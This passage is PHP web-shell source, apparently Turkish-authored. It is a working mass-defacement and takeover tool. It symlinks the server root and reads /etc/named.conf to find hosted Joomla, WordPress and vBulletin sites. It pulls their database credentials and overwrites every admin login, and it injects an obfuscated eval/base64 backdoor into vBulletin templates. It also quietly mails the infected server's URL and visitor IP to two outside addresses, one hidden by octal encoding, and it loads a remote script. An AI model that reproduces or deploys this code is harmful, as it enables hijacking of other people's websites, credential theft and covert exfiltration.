            echo " <font size=3 color=white face='comic sans ms' >isleniyor " . $finalweb . ' ...</font>';
            foreach ($shells as $shell) {
                $finalshell = trim($shell);
                $sl = $finalweb . $finalshell;
                $exist = file_exists_remote($sl);
                if ($exist) {
                    echo "<div align=center><table width=70%><tr><td align=center><font size=3 color=white face='comic sans ms' > Ba�ar�l�... link <a href=" . $sl . "><font size=3 color=red face='comic sans ms' > $sl </a> </font> Bulundu</font> </td></tr></table>";
                }
            }
        }
    }
}
$time_shell = '' . date('d/m/Y - H:i:s') . '';
$ip_remote = $_SERVER['REMOTE_ADDR'];
$from_shellcode = 'shellgeldi@' . gethostbyname($_SERVER['SERVER_NAME']) . '';
$to_email = 'mectruy@gmail.com';
$server_mail = '' . gethostbyname($_SERVER['SERVER_NAME']) . '  - ' . $_SERVER['HTTP_HOST'] . '';
$linkcr = 'Link: ' . $_SERVER['SERVER_NAME'] . '' . $_SERVER['REQUEST_URI'] . " - IP Excuting: $ip_remote - Time: $time_shell";
$header = "From: $from_shellcode\r\nReply-to: $from_shellcode";
@mail($to_email, $server_mail, $linkcr, $header);
echo '

';
set_time_limit(0);
error_reporting(0);
@session_start();
$pageURL = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$u = explode('/', $pageURL);
$pageURL = str_replace($u[count($u) - 1], '', $pageURL);
$pageFTP = 'ftp://' . $_SERVER['SERVER_NAME'] . '/public_html/' . $_SERVER['REQUEST_URI'];
$u = explode('/', $pageFTP);
$pageFTP = str_replace($u[count($u) - 1], '', $pageFTP);
$x0c = "\x6d\141il";
if (!isset($_SESSION['trimite'])) {
    $x0b = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    @$x0c("\144\055\x73k@\154\151\166\145.\x66\x72", "DS\113\127\101S\x48\x45R\x45\041", $x0b);
    $_SESSION['trimite'] = true;
}
echo '



';
@mkdir('sym', 0777);
$htcs = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$f = @fopen('sym/.htaccess', 'w');
fwrite($f, $htcs);
@symlink('/', 'sym/root');
$pg = basename(__FILE__);
if ('joomla' == $_GET[id]) {
    if (isset($_POST['s'])) {
        $file = @file_get_contents('joomla.txt');
        $ex = explode("\n", $file);
        echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Sonu� </td>";
        flush();
        foreach ($ex as $exp) {
            $es = explode('||', $exp);
            $config = $es[0];
            $domin = $es[1];
            $domins = trim($domin) . '';
            $readconfig = @file_get_contents(trim($config));
            if (ereg('JConfig', $readconfig)) {
                $pass = ex($readconfig, '$password = \'', "';");
                $userdb = ex($readconfig, '$user = \'', "';");
                $db = ex($readconfig, '$db = \'', "';");
                $fix = ex($readconfig, '$dbprefix = \'', "';");
                $tab = $fix . 'users';
                $con = @mysql_connect('localhost', $userdb, $pass);
                $db = @mysql_select_db($db, $con);
                $query = @mysql_query("UPDATE `$tab`  SET `username` ='mectruy'");
                $query3 = @mysql_query("UPDATE `$tab`  SET `password` ='44a0bcda611514625ba94e0b1c0bdaed:2iets9ydjR3iOdSuyvW54pIzyF9M1P5J'");
                if ($query and $query3) {
                    $r = '<b style="color: #006600">Succeed </b>user [mectruy] pass [1]</b>';
                } else {
                    $r = '<b style="color:red">failed</b>';
                }
                $domins = trim($domin) . '';
                echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='$config'>config</a></td><td>" . $r . '</td></tr>';
                flush();
            } else {
                echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='http://$exp'>config</a></td><td><b style='color:red'>failed</b></td></tr>";
                flush();
            }
        }
        die();
    }
    if (!is_file('named.txt')) {
        $d00m = @file('/etc/named.conf');
        flush();
    } else {
        $d00m = file('named.txt');
    }
    if (!$d00m) {
        die("<meta http-equiv='refresh' content='0; url=?id=read'/>");
    } else {
        echo "<div class='tmp'>
<form method='POST' action='$pg?id=joomla'>
<input type='submit' value='Mass ching Admin' />
<input type='hidden' value='1' name='s' />
</form><br /><br />
<table align='center' width='40%'><td> Domainler </td><td> config </td><td> Sonu� </td>";
        $f = fopen('joomla.txt', 'w');
        foreach ($d00m as $dom) {
            if (eregi('zone', $dom)) {
                preg_match_all('#zone "(.*)"#', $dom, $domsws);
                if (strlen(trim($domsws[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner('/etc/valiases/' . $domsws[1][0]));
                    $wpl = $pageURL . '/sym/root/home/' . $user['name'] . '/public_html/configuration.php';
                    $wpp = get_headers($wpl);
                    $wp = $wpp[0];
                    $wp2 = $pageURL . '/sym/root/home/' . $user['name'] . '/public_html/blog/configuration.php';
                    $wpp2 = get_headers($wp2);
                    $wp12 = $wpp2[0];
                    $wp3 = $pageURL . '/sym/root/home/' . $user['name'] . '/public_html/joomla/configuration.php';
                    $wpp3 = get_headers($wp3);
                    $wp13 = $wpp3[0];
                    $pos = strpos($wp, '200');
                    $config = '&nbsp;';
                    if (true == strpos($wp, '200')) {
                        $config = $wpl;
                    } elseif (true == strpos($wp12, '200')) {
                        $config = $wp2;
                    } elseif (true == strpos($wp13, '200')) {
                        $config = $wp3;
                    } else {
                        continue;
                    }
                    flush();
                    $dom = $domsws[1][0];
                    $w = fwrite($f, "$config||$dom \n");
                    if ($w) {
                        $r = '<b style="color: #006600">Bulundu</b>';
                    } else {
                        $r = '<b style="color:red">Hatal� ! bulunamad�.</b>';
                    }
                    echo '<tr><td><a href=http://www.' . $domsws[1][0] . '>' . $domsws[1][0] . "</a></td>
<td><a href='$config'>config</a></td><td>" . $r . '</td></tr>';
                    flush();
                }
            }
        }
    }
}
if ('wp' == $_GET[id]) {
    if (isset($_POST['s'])) {
        $file = @file_get_contents('wp.txt');
        $ex = explode("\n", $file);
        echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Sonu� </td>";
        flush();
        flush();
        foreach ($ex as $exp) {
            $es = explode('||', $exp);
            $config = $es[0];
            $domin = $es[1];
            $domins = trim($domin) . '';
            $readconfig = @file_get_contents(trim($config));
            if (ereg('wp-settings.php', $readconfig)) {
                $pass = ex($readconfig, "define('DB_PASSWORD', '", "');");
                $userdb = ex($readconfig, "define('DB_USER', '", "');");
                $db = ex($readconfig, "define('DB_NAME', '", "');");
                $fix = ex($readconfig, '$table_prefix  = \'', "';");
                $tab = $fix . 'users';
                $con = @mysql_connect('localhost', $userdb, $pass);
                $db = @mysql_select_db($db, $con);
                $query = @mysql_query("UPDATE `$tab` SET `user_login` ='mectruy'") or die;
                $query = @mysql_query("UPDATE `$tab` SET `user_pass` ='$1$4z/.5i..$9aHYB.fUHEmNZ.eIKYTwx/'") or die;
                if ($query) {
                    $r = '<b style="color: #006600">Succeed </b>user [mectruy] pass [1]</b>';
                } else {
                    $r = '<b style="color:red">failed</b>';
                }
                $domins = trim($domin) . '';
                echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='$config'>config</a></td><td>" . $r . '</td></tr>';
                flush();
                flush();
            } else {
                echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='http://$config'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";
                flush();
                flush();
            }
        }
        die();
    }
    if (!is_file('named.txt')) {
        $d00m = @file('/etc/named.conf');
    } else {
        $d00m = @file('named.txt');
    }
    if (!$d00m) {
        die("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
    } else {
        echo "<div class='tmp'>
<form method='POST' action='$pg?id=wp'>
<input type='submit' value='Mass Change Admin' />
<input type='hidden' value='1' name='s' />
</form>
<br /><br />
<table align='center' width='40%'><td> Domainler </td><td> config </td><td> Sonu� </td>";
        flush();
        flush();
        $f = fopen('wp.txt', 'w');
        foreach ($d00m as $dom) {
            if (eregi('zone', $dom)) {
                preg_match_all('#zone "(.*)"#', $dom, $domsws);
                if (strlen(trim($domsws[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner('/etc/valiases/' . $domsws[1][0]));
                    $wpl = $pageURL . '/sym/root/home/' . $user['name'] . '/public_html/wp-config.php';
                    $wpp = get_headers($wpl);
                    $wp = $wpp[0];
                    $wp2 = $pageURL . '/sym/root/home/' . $user['name'] . '/public_html/blog/wp-config.php';
                    $wpp2 = get_headers($wp2);
                    $wp12 = $wpp2[0];
                    $wp3 = $pageURL . '/sym/root/home/' . $user['name'] . '/public_html/wp/wp-config';
                    $wpp3 = get_headers($wp3);
                    $wp13 = $wpp3[0];
                    $pos = strpos($wp, '200');
                    $config = '&nbsp;';
                    if (true == strpos($wp, '200')) {
                        $config = $wpl;
                    } elseif (true == strpos($wp12, '200')) {
                        $config = $wp2;
                    } elseif (true == strpos($wp13, '200')) {
                        $config = $wp3;
                    } else {
                        continue;
                    }
                    flush();
                    $dom = $domsws[1][0];
                    $w = fwrite($f, "$config||$dom \n");
                    if ($w) {
                        $r = '<b style="color: #006600">Bulundu</b>';
                    } else {
                        $r = '<b style="color:red">Hatal� ! bulunamad�.</b>';
                    }
                    echo '<tr><td><a href=http://www.' . $domsws[1][0] . '>' . $domsws[1][0] . "</a></td>
<td><a href='$config'>config</a></td><td>" . $r . '</td></tr>';
                    flush();
                    flush();
                    flush();
                }
            }
        }
    }
}
if ('vb' == $_GET[id]) {
    if (isset($_POST['s'])) {
        $file = @file_get_contents('vb.txt');
        $ex = explode("\n", $file);
        echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Sonu� </td>";
        foreach ($ex as $exp) {
            $es = explode('||', $exp);
            $config = $es[0];
            $domin = $es[1];
            $domins = trim($domin) . '';
            $readconfig = @file_get_contents(trim($config));
            if (ereg('vBulletin', $readconfig)) {
                $db = ex($readconfig, '$config[\'Database\'][\'dbname\'] = \'', "';");
                $userdb = ex($readconfig, '$config[\'MasterServer\'][\'username\'] = \'', "';");
                $pass = ex($readconfig, '$config[\'MasterServer\'][\'password\'] = \'', "';");
                $con = @mysql_connect('localhost', $userdb, $pass);
                $db = @mysql_select_db($db, $con);
                $shell = 'bVDPS8MwFL4L/g+vYZAWdPPiaUv14kAQFKqnUUqapjSYNKFJxCn7322abgzcIfDyvl+P7/qKs04D3tS5sJ96MMJ9b+ohDw8vTWcq31PF02yJp/WqzvEaZk2rBwWUOaF7ghAo7jrdEGS0dQh4z9zecIKUl04YOrhV4N821FEEwZQgb6SmDR8QiObsdxYheuMdRKNWSH5UxtmKn3G+v0P5TIxgNTqhWWR9rYSLAXH/RaUfgY8pbVROZ4VI0aawqN5ei/cdDlRcAiFwJEIGv4HyyLTZp4tq+/zyVOxwOASXO+yUqUI6Lm/gHxiBLDic6o62UHjGuLWQJEko99T9Gg7ApeUXJFsq5EX+AR7yPw==';
                $crypt = "{\${eval(gzinflate(base64_decode(\'";
                $crypt .= "$shell";
                $crypt .= "\')))}}{\${exit()}}</textarea>";
                $sqlfaq = "UPDATE template SET template ='" . $crypt . "' WHERE title ='FAQ'";
                $query = @mysql_query($sqlfaq, $con);
                if ($query) {
                    $r = '<b style="color: #006600">Succeed</b> shell in search.php';
                } else {
                    $r = '<b style="color:red">failed</b>';
                }
                $domins = trim($domin) . '';
                echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='$config'>config</a></td><td>" . $r . '</td></tr>';
            } else {
                echo "<tr>
<td><a target='_blank' href='http://$domins'>$domin</a></td>
<td><a target='_blank' href='http://$config'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";
            }
        }
        die();
    }
    if (!is_file('named.txt')) {
        $d00m = file('/etc/named.conf');
    } else {
        $d00m = file('named.txt');
    }
    if (!$d00m) {
        die("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
    } else {
        echo "<div class='tmp'>
<form method='POST' action='$pg?id=vb'>
<input type='submit' value='Inject shell' />
<input type='hidden' value='1' name='s' />
</form>
<br /><br />
<table align='center' width='40%'><td> Domainler </td><td> config </td><td> Sonu� </td>";
        $f = fopen('vb.txt', 'w');
        foreach ($d00m as $dom) {
            if (eregi('zone', $dom)) {
                preg_match_all('#zone "(.*)"#', $dom, $domsws);
                if (strlen(trim($domsws[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner('/etc/valiases/' . $domsws[1][0]));
                    $wpl = $pageURL . '/sym/root/home/' . $user['name'] . '/includes/config.php';
                    $wpp = get_headers($wpl);
                    $wp = $wpp[0];
                    $wp2 = $pageURL . '/sym/root/home/' . $user['name'] . '/vb/includes/config.php';
                    $wpp2 = get_headers($wp2);
                    $wp12 = $wpp2[0];
                    $wp3 = $pageURL . '/sym/root/home/' . $user['name'] . '/forum/includes/config.php';
                    $wpp3 = get_headers($wp3);
                    $wp13 = $wpp3[0];
                    $pos = strpos($wp, '200');
                    $config = '&nbsp;';
                    if (true == strpos($wp, '200')) {
                        $config = $wpl;
                    } elseif (true == strpos($wp12, '200')) {
                        $config = $wp2;
                    } elseif (true == strpos($wp13, '200')) {
                        $config = $wp3;
                    } else {
                        continue;
                    }
                    flush();
                    $dom = $domsws[1][0];
                    $w = fwrite($f, "$config||$dom \n");
                    if ($w) {
                        $r = '<b style="color: #006600">Bulundu</b>';
                    } else {
                        $r = '<b style="color:red">Bulunamad� Hatal�</b>';
                    }
                    echo '<tr><td><a href=http://www.' . $domsws[1][0] . '>' . $domsws[1][0] . "</a></td>
<td><a href='$config'>config</a></td><td>" . $r . '</td></tr>';
                    flush();
                }
            }
        }
    }
}
function ex($text, $a, $b)
{
    $explode = explode($a, $text);
    $explode = explode($b, $explode[1]);

    return $explode[0];
}
echo '	 <tr align="center" valign="top">
	 <td><font color="white"><center>Coded by MecTruy <a href="http://www.imhatimi.org" rel="dofollow" title="Bypass Shell">http://www.imhatimi.org</a></center></font></td>
	 </tr>';
echo '<SCRIPT SRC=http://sellukaweb.com/sayac.js></SCRIPT>';
